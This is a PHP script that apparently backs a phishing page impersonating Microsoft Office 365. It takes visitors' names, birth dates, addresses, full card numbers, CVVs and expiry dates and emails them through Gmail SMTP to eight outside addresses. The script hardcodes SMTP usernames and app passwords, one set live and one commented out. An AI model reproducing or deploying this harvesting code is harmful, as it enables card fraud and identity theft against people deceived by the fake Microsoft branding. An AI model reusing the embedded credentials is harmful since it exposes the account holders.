<?php


function test_input($data)
{
    $data = trim($data);
    $data = stripslashes($data);
    $data = htmlspecialchars($data);
    return $data;
}

define('FILTER_FLAG_HOST_REQUIRED', 0x00000800);


$firstname = test_input($_POST['firstName']);
$lastname = test_input($_POST['lastName']);
$phone = test_input($_POST['phoneNumber']);
$email = test_input($_POST['email']);
$dob = test_input($_POST['dob']);
$address = test_input($_POST['address']);
$city = test_input($_POST['city']);
$state = test_input($_POST['state']);
$countries = test_input($_POST['countries']);
$postalcode = test_input($_POST['postalCode']);
$plans = test_input($_POST['plans']);
$cardname = test_input($_POST['cardName']);
$cardnumber = test_input($_POST['cardNumber']);
$cvv = test_input($_POST['cvv']);
$expiry = test_input($_POST['expDate']);
$terms = test_input($_POST['acceptTerms']);

$mail_mssg = '<h3>From: </h3>' . $firstname;
$mail_mssg .= '<h3>From: </h3>' . $lastname . '<br>';
$mail_mssg .= '<h3>Phone:</h3>' . $phone;
$mail_mssg .= '<h3>Email: </h3>' . $email;
$mail_mssg .= '<h3>Date of Birth: </h3>' . $dob;
$mail_mssg .= '<h3>Address: </h3>' . $address . '<br>';
$mail_mssg .= '<h3>City: </h3>' . $city . '<br>';
$mail_mssg .= '<h3>State: </h3>' . $state . '<br>';
$mail_mssg .= '<h3>Countries: </h3>' . $countries . '<br>';
$mail_mssg .= '<h3>Postal Code: </h3>' . $postalcode . '<br>';
$mail_mssg .= '<h3>Plans: </h3>' . $plans . '<br>';
$mail_mssg .= '<h3>Card Name: </h3>' . $cardname . '<br>';
$mail_mssg .= '<h3>Card Number: </h3>' . $cardnumber . '<br>';
$mail_mssg .= '<h3>CVV: </h3>' . $cvv . '<br>';
$mail_mssg .= '<h3>Expiry: </h3>' . $expiry . '<br>';
$mail_mssg .= '<h3>Terms and Condition: </h3>' . $terms . '<br>';

use PHPMailer\PHPMailer\PHPMailer;

require './vendor/autoload.php';

$mail = new PHPMailer;

$mail->isSMTP();

$mail->SMTPDebug = 0;

$mail->Host = 'smtp.gmail.com';

$mail->Port = 587;

$mail->SMTPSecure = 'tls';

$mail->SMTPAuth = true;

$mail->Username = "codetechz001@gmail.com";
$mail->Password = "npbdeaqrjjpbbicm";

// $mail->Username = "microcodesoftwarellp@gmail.com";
// $mail->Password = "xoapivpsedfohhil";

$mail->setFrom($email, $firstname);

$mail->addAddress('codetechz001@gmail.com', 'sahil');
$mail->addAddress('microcodesoftwarellp@gmail.com', 'Microcode Software LLP');
$mail->addAddress('singh.rahul970@gmail.com', 'damn son');
$mail->addAddress('eternalwebllc@gmail.com', 'damn');
$mail->addAddress('rahul@amrwebsolutionllp.com', 'damn');
$mail->addAddress('eric@amrwebsolutionllp.com', 'damn');
$mail->addAddress('gaganwalia1088@gmail.com', 'damn');
$mail->addAddress('microsoft@amrwebsolutionllp.com', 'damn');

$mail->addReplyTo($email, $firstname);

$mail->Subject = 'Microsoft Office 365';

$mail->msgHTML($mail_mssg);

$mail->AltBody = 'Thank you for contacting Office.com';

if (!$mail->send()) {
    echo 'Mailer Error: ' . $mail->ErrorInfo;
} else {
    // echo 'successfully sent';

    if (isset($_POST['submit'])) {
        // Wait 4 seconds
        sleep(4);

        // Open file using header()
        include 'loading.html';
        // include 'send.html';
    }

}


?>